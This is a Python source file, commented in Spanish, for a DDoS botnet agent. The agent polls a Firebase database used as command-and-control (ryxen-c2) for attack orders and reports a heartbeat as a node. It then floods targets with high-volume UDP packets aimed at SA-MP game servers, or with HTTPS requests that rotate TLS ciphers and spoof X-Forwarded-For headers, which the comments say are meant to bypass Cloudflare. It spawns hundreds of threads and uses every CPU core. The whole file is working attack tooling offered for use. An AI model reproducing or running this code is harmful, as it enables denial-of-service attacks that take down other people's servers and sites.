import asyncio, aiohttp, time, random, ssl, socket, threading, multiprocessing

DB_URL = "https://ryxen-c2-default-rtdb.firebaseio.com/attack.json"
NODES_URL = "https://ryxen-c2-default-rtdb.firebaseio.com/nodes"

# --- MOTOR L4 (UDP/SAMP) - GIGABIT FLOOD ---
def udp_power(ip, port, end_time):
    # Usamos AF_INET y SOCK_DGRAM para UDP puro (SAMP 7777)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # Payload pesado de 1450 bytes para saturar el ancho de banda sin fragmentar
    data = random._urandom(1450)
    while time.time() < end_time:
        try:
            s.sendto(data, (ip, int(port)))
        except: pass

# --- MOTOR L7 (HTTPS/TLS) - BYPASS ESTRATEGIA ---
async def l7_ultra(target, end_time, sem):
    # Rotación de Cifrados para forzar a Cloudflare a re-negociar SSL constantemente
    ciphers = [
        'ECDHE-RSA-AES128-GCM-SHA256', 'ECDHE-ECDSA-AES128-GCM-SHA256',
        'TLS_AES_128_GCM_SHA256', 'ECDHE-RSA-AES256-GCM-SHA384'
    ]
    ctx = ssl.create_default_context()
    ctx.set_ciphers(':'.join(ciphers))
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    conn = aiohttp.TCPConnector(limit=0, ssl=ctx, family=socket.AF_INET)
    async with aiohttp.ClientSession(connector=conn) as session:
        while time.time() < end_time:
            async with sem:
                try:
                    headers = {
                        'User-Agent': f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/{random.randint(500,600)}.36',
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.5',
                        'X-Forwarded-For': f'{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}',
                        'Cache-Control': 'no-cache',
                        'Connection': 'keep-alive'
                    }
                    async with session.get(target, headers=headers, timeout=1, allow_redirects=False) as r:
                        r.close()
                except: continue

def spawn_l7(target, end_time):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    sem = asyncio.Semaphore(30000) # Buffer masivo
    # 320 hilos por cada proceso de núcleo
    tasks = [l7_ultra(target, end_time, sem) for _ in range(320)]
    loop.run_until_complete(asyncio.gather(*tasks))

async def main():
    # Registro de nodo simplificado
    nid = f"RX-{random.randint(1000,9999)}"
    async with aiohttp.ClientSession() as session:
        last_s = ""
        while True:
            try:
                # El agente ahora reporta su IP cada ciclo para confirmar que está vivo
                await session.put(f"{NODES_URL}/{nid}.json", json={"id": nid, "t": time.time()})
                async with session.get(DB_URL, timeout=5) as r:
                    data = await r.json()
                
                if data and data.get('stamp') != last_s:
                    last_s = data['stamp']
                    method, target, duration = data['method'], data['target'], int(data['time'])
                    if duration <= 0: continue

                    print(f"[!] Lanzando {method} a {target} por {duration}s")
                    end_attack = time.time() + duration

                    if ".udp" in method or ".samp" in method:
                        h, p = target.split(':')
                        # Lanzamos 320 hilos UDP
                        for _ in range(320):
                            threading.Thread(target=udp_power, args=(h, p, end_attack), daemon=True).start()
                    else:
                        # Multiprocessing para romper el GIL y usar toda la CPU
                        for _ in range(multiprocessing.cpu_count()):
                            multiprocessing.Process(target=spawn_l7, args=(target, end_attack), daemon=True).start()
            except: pass
            await asyncio.sleep(2)

if __name__ == "__main__":
    asyncio.run(main())
